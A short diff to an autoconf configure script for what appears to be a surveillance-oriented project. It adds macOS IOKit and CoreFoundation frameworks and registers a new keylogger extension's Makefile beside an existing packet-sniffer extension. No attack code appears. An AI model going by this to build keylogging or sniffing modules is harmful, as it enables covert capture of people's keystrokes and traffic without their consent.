@@ -33,7 +33,7 @@ case $host_os in
 			 AC_DEFINE(HAVE_KEYBOARD)
 			 AC_DEFINE(HAVE_MOUSE)
 			 AC_DEFINE(HAVE_MIC)
-			 AC_SUBST([PLATFORM_LDADD], ["-framework AppKit $PLATFORM_LDADD -framework Cocoa"])],
+			 AC_SUBST([PLATFORM_LDADD], ["-framework AppKit $PLATFORM_LDADD -framework Cocoa -framework CoreFoundation -framework IOKit"])],
 			[HOST_OS=ios])
 		AC_DEFINE([SPT_TYPE], [SPT_REUSEARGV])
 		;;
@@ -81,6 +81,7 @@ AC_CONFIG_FILES([
 	Makefile
 	src/Makefile
 	extensions/Makefile
+	extensions/keylogger/Makefile
 	extensions/sniffer/Makefile
 ])
 
